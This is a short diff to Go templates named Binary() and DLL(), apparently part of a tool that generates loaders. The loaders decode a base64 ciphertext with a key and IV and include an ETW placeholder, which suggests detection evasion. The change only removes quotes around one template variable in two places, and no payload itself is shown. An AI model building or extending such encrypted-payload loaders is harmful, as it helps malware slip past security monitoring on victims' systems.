@@ -575,7 +575,7 @@ func Binary() string {
 		{{.Variables.ptr}} := func() {
 		}
 		{{.Variables.ciphertext}}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.fullciphertext}}")
+		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
 		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
 	
@@ -770,7 +770,7 @@ func DLL() string {
 		{{.Variables.Versionfunc}}()
 		{{.Variables.ETW}}
 		{{.Variables.ciphertext}}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.fullciphertext}}")
+		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
 		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
 	
